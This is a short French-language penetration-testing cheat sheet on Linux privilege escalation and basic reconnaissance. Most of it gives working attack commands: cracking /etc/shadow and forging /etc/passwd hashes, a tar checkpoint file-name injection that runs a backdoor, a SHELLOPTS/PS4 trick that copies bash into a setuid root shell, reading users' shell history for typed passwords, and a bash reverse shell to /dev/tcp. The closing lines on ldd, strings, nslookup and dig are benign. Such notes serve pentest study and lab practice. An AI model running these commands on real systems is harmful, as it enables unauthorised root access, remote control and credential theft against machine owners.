Pour une [PrivEsc](cheat_sheet--PrivEsc_5.html) ( si aucune vuln) brute force ([Crack](cheat_sheet--Crack_8.html)) le mdp de /etc/shadow

Généré un hash sha512 :

mkpasswd -m sha-512 <mot ou mdp>

Généré un hash pour le fichier /etc/passwd :

openssl passwd <mdp au choix>

pour une [PrivEsc](cheat_sheet--PrivEsc_5.html) on voit que lorsque **tar** s'execute elle execute deux nom de fichier comme des commande celle-ci plus exactement :

touch /home/user/--checkpoint=1

touch /home/user/--checkpoint-action=exec=<Backdoor>

L' exécutable /usr/local/bin/suid-env peut être exploité car il hérite de la variable d'environnement PATH de l'utilisateur et tente d'exécuter des programmes sans spécifier de chemin absolu. :

vérifier la version de bash :

/bin/bash --version

si un fichier s'execute en tant que root et que la vesion de bin/bash est inferieur a la 4.4 :

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <CHEMIN DU FICHIER>

puis :

/tmp/rootbash -p

Si un utilisateur tape accidentellement son mot de passe sur la ligne de commande plutôt que dans une invite de mot de passe, il peut être enregistré dans un fichier historique. Affichez le contenu de tous les fichiers d'historique cachés dans le répertoire personnel de l'utilisateur :

cat ~/.*history | less




commande ldd permet de lister l'ensemble des bibliothèques partagées requises par un exécutable.

syntax :

ldd [chemin du programme]

commande pour executer un reverse_shell a l'aide de netcat :

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

utilisation de l'outils de débug strace pour pouvoir trouver les appels de fichier ou ceux qui manque et pouvoir après modifier ses fichier ou les crée pour une [PrivEsc](cheat_sheet--PrivEsc_5.html) si la commande et répértorier en tant qu'admin (find) ex de la commande ou l'on effectue en plus une recherche de certain mot :

strace <FILE OR SERVICE, COMMANDE> 2>&1 | grep -iE "open|access|no such file"

rechercher des chaine de caractere imprimable dans un fichier :

strings <FICHIER>

trouver l'ip d'un nom de domaine avec la commande :
	nslookup DOMAIN_NAME

trouver les enregistrement dns public avec la commande : 
	dig DOMAIN_NAME
ou
	dig DOMAIN_NAME TYPE